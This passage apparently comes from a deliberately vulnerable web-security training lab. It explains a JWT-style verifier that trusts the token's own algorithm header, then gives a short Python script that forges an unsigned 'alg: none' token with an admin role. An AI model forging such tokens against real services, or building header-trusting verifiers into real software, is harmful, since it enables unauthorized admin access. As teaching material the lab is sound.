This hand-rolled, HS256-signed token format is the same shape as a real JWT — a base64url header, payload, and signature joined with dots. The verifier's bug: it reads which algorithm to use for verification from the token's own header, rather than always expecting HS256. An attacker who controls the token controls how it gets checked.

{% endblock %} {% block detect %}

Get a real guest token from /a08/api-token and submit it below — access is correctly denied, since the guest role isn't admin. A tampered signature is also correctly rejected. The bug only appears once you change which algorithm the token itself claims to use.

{% endblock %} {% block exploitation %}

Build this token yourself — no valid signature required, because the header simply says not to check one: 

import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"user": "attacker", "role": "admin"}).encode())
print(f"{header}.{payload}.")

Submit the printed token below. It returns ADMIN ACCESS GRANTED — the verifier saw "alg": "none" in the header and simply skipped signature verification entirely, exactly as the header instructed it to.
